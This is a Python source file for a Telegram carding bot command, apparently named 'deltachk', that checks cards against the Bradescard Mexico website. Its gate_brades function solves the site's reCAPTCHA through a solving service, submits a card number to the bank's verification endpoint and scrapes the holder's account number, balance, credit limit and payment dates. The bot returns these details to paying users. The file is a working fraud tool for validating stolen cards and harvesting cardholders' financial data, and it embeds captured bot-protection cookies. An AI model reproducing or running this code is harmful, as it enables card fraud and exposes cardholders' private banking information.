from DeltaLib.api import TelegramAPI
from DeltaLib.command_decorator import command
from config.config import RANGOS, LOGS_CHANNEL
from utils.General.connection import ConnectionDB
from utils.General.utils import Utils
from utils.General.plantillas import DeltaPlantillas
from utils.funciones.funcion_registrado import verificareg
from utils.funciones.funcion_banuser import Baned
from utils.funciones.funcion_vip import Premium
from DeltaLib.telegram_message import Message
from utils.funciones.funcion_grupos import Grupo
from aiohttp_socks.connector import ProxyConnector
from utils.proxys.proxies import Proxies
from utils.General.funcs_global import Funcs_Global
from config.config import CHANNEL_ID_ERRORS
import re, time, uuid, random,string, aiohttp, base64, traceback


@command(["bra"])
async def BradesCard_tool(message):
    tgapi = TelegramAPI()
    reply_message = tgapi.reply_message
    edit_message = tgapi.edit_message
    send_message = tgapi.send_message
    try:
        m = Message(message)
    except ValueError as e:
        print(e)
        return await reply_message(message['chat']['id'], str(e), message['message_id'])



    db = ConnectionDB()
    baned = Baned()
    premium = Premium()
    grupo = Grupo()

    verfreg = verificareg.verificar(db, m.user_id)
    if verfreg == False:
        return await reply_message(m.chat_id, DeltaPlantillas.unregister(), m.message_id)
    
    valor, razon = baned.verificar(m.user_id)
    if valor == True:
        banuser = DeltaPlantillas.ban_user(razon)

        return await reply_message(m.chat_id, banuser, m.message_id)
    


    hh = db._get_info_user(m.user_id)

    role = hh[1]
    apodo = hh[11]


    chat_type = m.chat_type
    namegr = m.chat_name
    usernamegr = m.chat_username
    chat_type = str(chat_type)

    gg = db._select_tool("BradesCard")

    status1 = gg[2]
    review = gg[4]
    razon = gg[3]
    tipo = gg[5]

    valor1 = premium.verificar_vip(m.user_id)
    grupo.registrar(m.chat_id, namegr, usernamegr, chat_type)
    valor2 = grupo.verificar_premium(m.chat_id)


    if tipo == "Free":

        if valor1 == False:
            if chat_type == "private":
                return await reply_message(m.chat_id, "¡𝐍𝐨 𝐞𝐬𝐭𝐚𝐬 𝐚𝐮𝐭𝐨𝐫𝐢𝐳𝐚𝐝𝐨 𝐜𝐨𝐧𝐭𝐚𝐜𝐭𝐞 𝐜𝐨𝐧 𝐞𝐥 𝐚𝐝𝐦𝐢𝐧𝐢𝐬𝐭𝐫𝐚𝐝𝐨𝐫 𝐩𝐚𝐫𝐚 𝐩𝐨𝐝𝐞𝐫 𝐚𝐜𝐭𝐮𝐚𝐥𝐢𝐳𝐚𝐫 𝐬𝐮 𝐜𝐮𝐞𝐧𝐭𝐚 𝐚 𝐩𝐫𝐞𝐦𝐢𝐮𝐦! ⚠️", m.message_id, DeltaPlantillas.reply_freeuser())
            
        if valor2 is False:
            if chat_type == "supergroup" or chat_type == "group":
                if valor1 == False:
                    return await reply_message(m.chat_id, "¡𝐆𝐫𝐮𝐩𝐨 𝐬𝐢𝐧 𝐀𝐮𝐭𝐨𝐫𝐢𝐳𝐚𝐜𝐢𝐨𝐧! ⚠️", m.message_id, DeltaPlantillas.reply_freeuser())
        
    elif tipo == "paid":
        if valor1 == False:
                if chat_type == "private":
                    return await reply_message(m.chat_id ,"¡𝐍𝐨 𝐞𝐬𝐭𝐚𝐬 𝐚𝐮𝐭𝐨𝐫𝐢𝐳𝐚𝐝𝐨 𝐜𝐨𝐧𝐭𝐚𝐜𝐭𝐞 𝐜𝐨𝐧 𝐞𝐥 𝐚𝐝𝐦𝐢𝐧𝐢𝐬𝐭𝐫𝐚𝐝𝐨𝐫 𝐩𝐚𝐫𝐚 𝐩𝐨𝐝𝐞𝐫 𝐚𝐜𝐭𝐮𝐚𝐥𝐢𝐳𝐚𝐫 𝐬𝐮 𝐜𝐮𝐞𝐧𝐭𝐚 𝐚 𝐩𝐫𝐞𝐦𝐢𝐮𝐦! ⚠️", m.message_id, DeltaPlantillas.reply_freeuser())
        if valor2 is False:
                if chat_type == "supergroup" or chat_type == "group":
                    if valor1 == False:
                        return await reply_message(m.chat_id ,"¡𝐆𝐫𝐮𝐩𝐨 𝐬𝐢𝐧 𝐀𝐮𝐭𝐨𝐫𝐢𝐳𝐚𝐜𝐢𝐨𝐧! ⚠️", m.message_id, DeltaPlantillas.reply_freeuser())
        elif valor2 is True:
                if chat_type == "supergroup" or chat_type == "group":
                    if valor1 == False:
                        return await reply_message(m.chat_id ,"¡𝐍𝐨 𝐞𝐬𝐭𝐚𝐬 𝐚𝐮𝐭𝐨𝐫𝐢𝐳𝐚𝐝𝐨 𝐜𝐨𝐧𝐭𝐚𝐜𝐭𝐞 𝐜𝐨𝐧 𝐞𝐥 𝐚𝐝𝐦𝐢𝐧𝐢𝐬𝐭𝐫𝐚𝐝𝐨𝐫 𝐩𝐚𝐫𝐚 𝐩𝐨𝐝𝐞𝐫 𝐚𝐜𝐭𝐮𝐚𝐥𝐢𝐳𝐚𝐫 𝐬𝐮 𝐜𝐮𝐞𝐧𝐭𝐚 𝐚 𝐩𝐫𝐞𝐦𝐢𝐮𝐦! ⚠️", m.message_id, DeltaPlantillas.reply_freeuser())

    

    
    if status1 == 0:
        return await reply_message(m.chat_id, DeltaPlantillas.off_tool("BradesCard", review, razon), m.message_id)


    if m.reply_message_id:
        input_str = m.reply_message_text
    else:
        input_str = m.text

    tiempoinicio = time.perf_counter()
    if m.reply_message_id:
        input_str = m.reply_message_text
    else:
        input_str = m.text

    try:
        ccsx = input_str.split(" ", 1)
    except:
        return await reply_message(m.chat_id, """<b>[<a href="tg://resolve?domain=deltachk">⽷</a>] Usar <code>/bra card</code></b>""", m.message_id)

    if len(ccsx) < 1:
        return await reply_message(m.chat_id, """<b>[<a href="tg://resolve?domain=deltachk">⽷</a>] Usar <code>/bra card</code></b>""", m.message_id)


    if len(ccsx) == 1:
        ccgen = ccsx[0]
    else:
        ccgen = ccsx[1]


    cc_data = Funcs_Global.get_cc(ccgen)
    if cc_data:
        cc, mes, ano, cvv = cc_data
        cc1 = f"{cc}|{mes}|{ano}|{cvv}"
    else:
        return await reply_message(m.chat_id, """<b>[<a href="tg://resolve?domain=deltachk">⽷</a>] Usar <code>/bra card</code></b>""", m.message_id)


    BIN = cc1[:6]

    try:
        bin_code, brand, types, level, bank, country_name, country_flag = Utils.binchek(BIN)
    except Exception as e:
        return reply_message(m.chat_id, f'<b>[<a href="tg://resolve?domain=deltachk">⽷</a>] 𝗕𝗶𝗻 ⇾ no encontrado <code>{BIN} ❌</code></b>', m.message_id)
    
    time1 = Funcs_Global.calculartiempo(tiempoinicio)
    Brader_MSG = await reply_message(m.chat_id, DeltaPlantillas.cero_porciento("BradesCard Balance Check", cc1, time1, m.username, role), m.message_id)

    if apodo is not None:
        role = apodo

    retries = 0
    max_retries = 2

    
    try:
        while retries < max_retries:
            FechaLimitePagoPersona, PagoMinimoPersona, PagoTotalMesPersona, FechaCortePersona, DisponibleComprasPersona, SaldoTotalPersona, LimiteCreditoPersona, CardBalance, limitesMxn, accountnumber = await gate_brades(cc1)


            if "Error" in FechaLimitePagoPersona:
                retries += 1
                continue

            break

        if "CC No Valida para BradesCard" in PagoMinimoPersona:
            e = PagoMinimoPersona.split("|")[0]
            traceback_str = PagoMinimoPersona.split("|")[1]
            mensaje = e
           
        elif "Error" in FechaLimitePagoPersona:
            e = PagoMinimoPersona.split("|")[0]
            traceback_str = PagoMinimoPersona.split("|")[1]
            mensaje = "$_Error, if the problem persists, contact the owner"
            await send_message(CHANNEL_ID_ERRORS, DeltaPlantillas.error_gate(m.chat_id, m.username, m.user_id, "BradesCard Balance", e, traceback_str))

        else:
            mensaje = ""
    
        tiempofinal = time.perf_counter()
        tiempo = tiempofinal - tiempoinicio
        tiempo = "{:.2f}".format(tiempo)
        
        if 'CC No Valida para BradesCard' in mensaje:
            resultado = f"""<b>BradesCard Balance Check</b>
- - - - - - - - - - - - - - - - - - - - - - - - - - 
[<a href="tg://resolve?domain=deltachk">⽷</a>] <b>Status:</b> <code>Error! ⚠️</code>
[<a href="tg://resolve?domain=deltachk">⽷</a>] <b>Card:</b> <code>{cc1}</code>
[<a href="tg://resolve?domain=deltachk">⽷</a>] <b>Msg:</b> <code>Solo Soporta CCS BradesCard</code> | <code>Only supports CCS BradesCard</code>
"""

        else:

            resultado = f"""<b>BradesCard Balance Check</b>
- - - - - - - - - - - - - - - - - - - - - - - - - - 
<b>[<a href="tg://resolve?domain=deltachk">⽷</a>] Status:</b> <code>Success! ✅</code>
<b>[<a href="tg://resolve?domain=deltachk">⽷</a>] Card:</b> <code>{cc1}</code>
<b>[<a href="tg://resolve?domain=deltachk">⽷</a>] Account Number:</b> <code>{accountnumber}</code>
- - - - - - - [<b>Card Details</b>] - - - - - - 
<b>[<a href="tg://resolve?domain=deltachk">⽷</a>] Card Balance:</b> <code>{CardBalance}</code>
<b>[<a href="tg://resolve?domain=deltachk">⽷</a>] Saldo Total Persona:</b> <code>{SaldoTotalPersona}</code>
<b>[<a href="tg://resolve?domain=deltachk">⽷</a>] Disponible para Compras:</b> <code>{DisponibleComprasPersona}</code>
<b>[<a href="tg://resolve?domain=deltachk">⽷</a>] Pago Minimo:</b> <code>{PagoMinimoPersona}</code>
<b>[<a href="tg://resolve?domain=deltachk">⽷</a>] Pago Total del Mes:</b> <code>{PagoTotalMesPersona}</code>
<b>[<a href="tg://resolve?domain=deltachk">⽷</a>] Limite Credito Persona:</b> <code>{LimiteCreditoPersona}</code>
<b>[<a href="tg://resolve?domain=deltachk">⽷</a>] Fecha Limite Pago:</b> <code>{FechaLimitePagoPersona}</code>
<b>[<a href="tg://resolve?domain=deltachk">⽷</a>] Fecha Corte Persona:</b> <code>{FechaCortePersona}</code>
- - - - - - - - - - - - - - - - - - - - - - - - - - 
<b>[<a href="tg://resolve?domain=deltachk">⽷</a>] 𝖯𝗋𝗈𝗑𝗒: Live ✅</b>
<b>[<a href="tg://resolve?domain=deltachk">⽷</a>] 𝖳𝗂𝗆𝖾: {tiempo}s</b>
<b>[<a href="tg://resolve?domain=deltachk">⽷</a>] 𝖢𝗁𝖾𝖼𝗄𝖾𝖽 𝖡𝗒: @{m.username} [{role}]</b>
"""
       
    except Exception as e:
        print(e)
        tiempofinal = time.perf_counter()
        tiempo = tiempofinal - tiempoinicio
        tiempo = "{:.2f}".format(tiempo)
        traceback_str = traceback.format_exc()
        await Funcs_Global.ErrorControl(e, traceback_str, e, cc1, "BradesCard Balance")
        resultado = DeltaPlantillas.finalizado(cc1, "Error => Please try again in a moment", "$Error_ ⚠️", types, brand, level, bank, country_name, country_flag, m.username, role, 'BradesCard Balance', tiempo, retries, "BradesCard Balance")
  
    return await edit_message(m.chat_id, Brader_MSG['result']['message_id'], resultado)




async def gate_brades(cc1):

    try:
        
        cc = cc1.split('|')[0]
        session = aiohttp.ClientSession()


        captcha = await Funcs_Global.Solverv2("6LdehgAVAAAAACpQnwTNpuZOiuyJfUg4Ug-9Tvjn", "https://www.bradescard.com.mx/")

        headers = {
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'accept-language': 'es-419,es;q=0.7',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                # Requests sorts cookies= alphabetically
                # 'cookie': 'bm_sz=D0967A935550163AC41EE309AA2FA68F~YAAQx/rerbYAvnCSAQAAc/ZniBnlNiFxlIqsQ8ipr9r3yG1rH9FcAzqBXTtKZfYokEC5jnscS6DYzGS5sCUSetUxAn98ua4X8er7FahvTd0ZlePswxnKujhiEcuImsM7MYTvUPNA22QUyuUtF5Y5i3Xa12RfqpLjm9vM/jTTmeucoFq5yFKaiud+9xiUYMim2Tyhac/Fbu58DIU2rlogUowc4EaKNBUhTrczdFAzFRzrKExsZyGRMcLs2Pe5XI0YeZN/CnsnCepxzZeCkq/gqqEIBLv3ZTdx6K9Ylu+qJCbDg5jPO5wtuzBKz8YqAMlDcznSk8pwzFtdDscpV4Oidiz4QXfuQRspzmhe6Ame2nxQJVuuwaMZW020Ce2xGbA6zTnR7tzd470LAtQt2huLJJnJNUEE/A==~4408886~3420742; bm_mi=570CFD2C074D2AD65454BA0FF428FC22~YAAQx/rerbsAvnCSAQAAS/5niBkuTO41f+Jccc/v/ncvvamV8hLxSXxYYc+wUSTxtNKVGNx/TktEQjXfVN07F+rrzFO14JQR7o2xwsu5r2nRraZGtlKENOob7n/FR68Lu3pTdskJ4ssUT+4MH3/Z7YvzR8OWBasvx2QwkBobIN3PgnjGbr672zJfmOzXdfXEIT8C4xOvAS4uaqQTbFDkAQGhw/o4luu2TIcKBxNTPxus7olqaUkxIsl7H8Ktai6RvTG9JckgTeBGi2fliJc+vEforWvDpJwI5nq4D8Pe5/XVOJv1gBwj2VTFWxXa4tigzS54HxwywilbtDj2IjwEDsg6Mklim61vo4J6A7Tl~1; _abck=5A7B05B080BFD29D840865A513C45FB0~0~YAAQx/rercQAvnCSAQAA8gZoiAxH1+5YTxzzGQSai8+W5Nv0ulxSPx0TJvwg9y1cihHdOdFg6CfXh9/g2A6VPFTU9UB4KhtTh3n9zDwC8HOoqPyyCtsoNYnVZrSm26nhkixfSY/5KTWvqg21KTuNKQd2L3ICLjnvk2YClQHleK/w7KmZnCLOS2N1SqLjFTDzsVJpS3JAuILUid2pGB4hxHeQvpZliyt3yuDVewkn9vfQxmjQU+6D5QvWlIOwMySl778ymFY6TRLKPtvgRRA5jojbWs5qT15PDTQBKVnaIoNgx8kGmblA28lxDBDCE8ASjlvbjZEvJGO8tnfHEBBG7EQZzPeyU0Q3fK5Qe73zZ4Dh/f7MvEXSU68CtWQGdtzZMmqVYyPGJFLMYHW/llf4rJooVeL6QNLZmGCIn9OJRxI4casKn3aJHmiOHJJ3qdUIlrnbnWv9QkXK5ivUprvXPQ==~-1~||0||~-1; ASP.NET_SessionId=3bk3mpnm4grtf1idvcmeyef5; bm_sv=DA804067E3547EDCD5656F060464180B~YAAQx/rerc0AvnCSAQAAUgloiBkjCRw2UuzAGoi9bO+yLoFB0eI3WnqHpsxEBgptD3NOVhjSlICkp6GGLe5xJTlZVOn4uRWE99Armyxorp4uiC+pQOK9lEcbBTZhgrqIps7m6uiPEeXKuGjUow4otwqjlxVhhvgPZScAaU0+39vyvir5v18R6aESXcoTE/oT38AUrhndQ+2CivBuyRpKwzeE2jkHZGrLOgZ+CTUgzX07yym80vqV5o/JCxTWfPvO8DuV+U3WqA==~1; ak_bmsc=2A8C29CDA1F87392691D61AF0448F45F~000000000000000000000000000000~YAAQx/rerdEAvnCSAQAAFwpoiBmUD8+RymuiqGUw0JpmvpqSRi5c/d5uOBvuBytiwjuuZlIgQS9Q3/UMYQ2VebdhDBgN1Yxw9zm7cmExUZBCbGRQVk3TnBTlm98w07kxNVwFQV+rR31yoV2pRFQOmnPapwjUyzU2H4tNa74crE6bcmdTCUa0NPODiCVEKfWw01a+7AiSUj3p2MqNTZQaumRdSjAe0S9ZSb8r2C4+GRVcqblj12wTTVYahSrHzSTGISbFRAJXOrUy4wnMrLKarTqGSW7SMuovuHZNm4vjPuYGMDpqDVIDre9JY10jZL8A2H51xbVmG5s80YTnh10qcOIvNHZRkmOTdhuISzNJoQn5P0TgiUHYXcvwz+sstheY2XKyyQjarMau3c7mBLvOlWohjDFelvWcKpgGoW0BVAdfNFiU1NoaX4/cti8oFKY/skNzn9gVSTrOl0AVQ4XDevpndV45JTiHtEfH2FEcVxVhovjDgNFLweXXkVVbPR1IRW42nQ==',
                'origin': 'https://www.bradescard.com.mx',
                'priority': 'u=1, i',
                'referer': 'https://www.bradescard.com.mx/bradescard.site/pago/index.html?v=0.0.3',
                'sec-ch-ua': '"Brave";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'sec-gpc': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
                'x-requested-with': 'XMLHttpRequest',
            }

        data = {
            'token': captcha,
            'tarjeta': cc,
            'terminos': 'true',
        }

        response = await session.post('https://www.bradescard.com.mx/bradescard.net/Home/VerificaTarjeta',headers=headers,data=data,)
        r1 = await response.text()

        if '"success":false' in r1:
            await session.close()
            raise Exception("CC No Valida para BradesCard")
        else:

            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'accept-language': 'es-419,es;q=0.5',
                'cache-control': 'no-cache',
                # 'cookie': '_abck=108A7F422E73CEA94EAB2205E2E35E55~-1~YAAQL6FivtnZv7aQAQAAnexRxAy2GfHq1mKcwgELASjpF7961GhOsjwevV6wA+44myNZk1J0m6jITwjMjAva0DRTmXDYz44GLqvV2lwCWvRCcDgZWUNRVr8ucBUGfN2PqghLM3pjV1SUpgxvuUPBSQCIcztp/PC1tQQ4TMyiPtuKOpwKElGE7ioXeHh/C2BX5CV/NECTYx3UbcdkWhIcjG1evn5IJGvVs5G6L65sFRFJ86BqUHR0TuzRl2chdCeM65tYYnBGG4z/xIa+UqOztTa0A3FDl/Q9M9WsfuxjCxq/ti6FL/zDmEhy3HTyhSN/92LAYaivZxaYwCJKd3xsklAUDu44Jeb4RIoQ0mxVE27Cvpd3gQl775To0QWDioqiAxyS~-1~-1~-1; ASP.NET_SessionId=4myi2wvikgam55xpcqi12syh; bm_sz=556A50355ECE6F7B34BD36830C0CF287~YAAQL6FivjPav7aQAQAABlRSxBgITXQfN/w2s5r4NdU+mrIhvcaJul2o6qjvtgER01CwvYtausgUripwsMvJPnqsklhN/ookCo58oW3hm/eBGpilymSQqYGxSoTveic0y3kkX+JTJI6uSiGTe8c1eujJSDeGPR33lgEzFKCBiKJZVZOCtFqy52+qgd1goPeo266BPX+nt4WLgK+9PwZ1LOjokD4io38yA+haJUJQQRgblkcpDNMshSfe/OUtkon54cqnLdgHZRBC2ST4+1X/y5zzrHLWjqYyjZ2/k9T244VHOkhjH/c36uSnFAPXvAdK40oeiFVOIEqwARXgLD7umUM+yOzjDUklVZLMGqjl+EMdumpAqw6Gpp7Qte+y324w2s7caMafaMY2u5Z/QvvrXzxd2URTzxq7zdQZpIc=~3425847~4536117',
                'pragma': 'no-cache',
                'priority': 'u=0, i',
                'referer': 'https://www.bradescard.com.mx/bradescard.site/pago/index.html?v=0.0.3',
                'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Brave";v="126"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'sec-gpc': '1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
            }

            response = await session.get('https://www.bradescard.com.mx/bradescard.net/', headers=headers)
            r2 = await response.text()

            accountnumber = r2.split("numerotarjetacliente: '")[1].split("'")[0]

            headers = {
                'accept': '*/*',
                'accept-language': 'es-419,es;q=0.7',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                # Requests sorts cookies= alphabetically
                # 'cookie': 'bm_mi=570CFD2C074D2AD65454BA0FF428FC22~YAAQx/rerbsAvnCSAQAAS/5niBkuTO41f+Jccc/v/ncvvamV8hLxSXxYYc+wUSTxtNKVGNx/TktEQjXfVN07F+rrzFO14JQR7o2xwsu5r2nRraZGtlKENOob7n/FR68Lu3pTdskJ4ssUT+4MH3/Z7YvzR8OWBasvx2QwkBobIN3PgnjGbr672zJfmOzXdfXEIT8C4xOvAS4uaqQTbFDkAQGhw/o4luu2TIcKBxNTPxus7olqaUkxIsl7H8Ktai6RvTG9JckgTeBGi2fliJc+vEforWvDpJwI5nq4D8Pe5/XVOJv1gBwj2VTFWxXa4tigzS54HxwywilbtDj2IjwEDsg6Mklim61vo4J6A7Tl~1; _abck=5A7B05B080BFD29D840865A513C45FB0~0~YAAQx/rercQAvnCSAQAA8gZoiAxH1+5YTxzzGQSai8+W5Nv0ulxSPx0TJvwg9y1cihHdOdFg6CfXh9/g2A6VPFTU9UB4KhtTh3n9zDwC8HOoqPyyCtsoNYnVZrSm26nhkixfSY/5KTWvqg21KTuNKQd2L3ICLjnvk2YClQHleK/w7KmZnCLOS2N1SqLjFTDzsVJpS3JAuILUid2pGB4hxHeQvpZliyt3yuDVewkn9vfQxmjQU+6D5QvWlIOwMySl778ymFY6TRLKPtvgRRA5jojbWs5qT15PDTQBKVnaIoNgx8kGmblA28lxDBDCE8ASjlvbjZEvJGO8tnfHEBBG7EQZzPeyU0Q3fK5Qe73zZ4Dh/f7MvEXSU68CtWQGdtzZMmqVYyPGJFLMYHW/llf4rJooVeL6QNLZmGCIn9OJRxI4casKn3aJHmiOHJJ3qdUIlrnbnWv9QkXK5ivUprvXPQ==~-1~||0||~-1; ASP.NET_SessionId=3bk3mpnm4grtf1idvcmeyef5; ak_bmsc=2A8C29CDA1F87392691D61AF0448F45F~000000000000000000000000000000~YAAQx/rerdEAvnCSAQAAFwpoiBmUD8+RymuiqGUw0JpmvpqSRi5c/d5uOBvuBytiwjuuZlIgQS9Q3/UMYQ2VebdhDBgN1Yxw9zm7cmExUZBCbGRQVk3TnBTlm98w07kxNVwFQV+rR31yoV2pRFQOmnPapwjUyzU2H4tNa74crE6bcmdTCUa0NPODiCVEKfWw01a+7AiSUj3p2MqNTZQaumRdSjAe0S9ZSb8r2C4+GRVcqblj12wTTVYahSrHzSTGISbFRAJXOrUy4wnMrLKarTqGSW7SMuovuHZNm4vjPuYGMDpqDVIDre9JY10jZL8A2H51xbVmG5s80YTnh10qcOIvNHZRkmOTdhuISzNJoQn5P0TgiUHYXcvwz+sstheY2XKyyQjarMau3c7mBLvOlWohjDFelvWcKpgGoW0BVAdfNFiU1NoaX4/cti8oFKY/skNzn9gVSTrOl0AVQ4XDevpndV45JTiHtEfH2FEcVxVhovjDgNFLweXXkVVbPR1IRW42nQ==; bm_sv=DA804067E3547EDCD5656F060464180B~YAAQx/rerSoBvnCSAQAASKtoiBndRR0xyHNuwYT0c1mKsD5RtaEEEqJeInn8DdrIa+AL+r3abQlaiIDsqcEajr7k3fVj6vo6xo3CSRocauvxeg4wfPxveKHR5w8sfTNSyOBKIiiPVRMBC/iU2eFZCYcLUJO+NS5QAOpXRHKPz3oCo3oGEdU8BadSy9lUdhIpmTfCjtq06tW9We16lMwvZmekhbXCkHBXuOOysft9Y5nDGsXz4MVRE77O+T3+70tpWExzgUF+aA==~1; bm_sz=D0967A935550163AC41EE309AA2FA68F~YAAQx/rerSsBvnCSAQAASKtoiBk5BGBbJolxuznRGW+Gn5M9Dd/VsOZU++Tg614WKarJDRXgkR9BrlyrTT5LKvbFCoyxT7bDLeWG8UyW0y5z34lrJ5udStOAdzv/W0GLQN20U90oKlifrc+dOT8ZutJferxPq/nZBURnrveZyEIxnw/vc8QBlGqAgyUweNahco5Hcyt/x6yoOSs8rKAGUNDCYSK00tsGOaZCZ827IXasWOp5pSU1ybq2MVLe2mTUbV+FlEdm3Sax+1mi8sHLUOp6LglQ/CXNSB9n0oVcmqPSqa4wGcvnfFMdvPrXBBV/Zvk8kK2xi89oI3cPPXk/Ueht+yU7Y6LNnDRtutXIEqcBV/ziQnNTIqedZGN44QRRVYKm6Bdkmobv+3IeI97SliYXhaSh/jmfWK9f9Slp+SrCaw==~4408886~3420742',
                'origin': 'https://www.bradescard.com.mx',
                'priority': 'u=1, i',
                'referer': 'https://www.bradescard.com.mx/bradescard.net/',
                'sec-ch-ua': '"Brave";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'sec-gpc': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
                'x-requested-with': 'XMLHttpRequest',
            }

            data = {
                'numerotarjetacliente': accountnumber,
            }

            response = await session.post(
                'https://www.bradescard.com.mx/bradescard.net/MasterPage/consultaResumenMovimientosPagoLinea',
                headers=headers,
                data=data,
            )
            r3 = await response.text()


            FechaLimitePagoPersona = r3.split('"FechaLimitePagoPersona":"')[1].split('"')[0]
            PagoMinimoPersona = r3.split('"PagoMinimoPersona":"')[1].split('"')[0]
            PagoTotalMesPersona = r3.split('"PagoTotalMesPersona":"')[1].split('"')[0]
            FechaCortePersona = r3.split('"FechaCortePersona":"')[1].split('"')[0]
            DisponibleComprasPersona = r3.split('"DisponibleComprasPersona":"')[1].split('"')[0]
            SaldoTotalPersona = r3.split('"SaldoTotalPersona":"')[1].split('"')[0]
            LimiteCreditoPersona = r3.split('"LimiteCreditoPersona":"')[1].split('"')[0]
            CardBalance = r3.split('"CardBalance":"')[1].split('"')[0]
            limitesMxn = r3.split('"limitesMxn":"')[1].split('"')[0]

            await session.close()

            return FechaLimitePagoPersona, PagoMinimoPersona, PagoTotalMesPersona, FechaCortePersona, DisponibleComprasPersona, SaldoTotalPersona, LimiteCreditoPersona, CardBalance, limitesMxn, accountnumber

    except Exception as e:
        await session.close()
        linea = str(e.__traceback__.tb_lineno)
        print("Error en Bradescard_Tool, la linea: " + linea + " " + str(e))
        res = "Error"
        traceback_str = traceback.format_exc()
        mensaje = f"{e} | {traceback_str}"
        return res, mensaje, None, None, None, None, None, None, None, None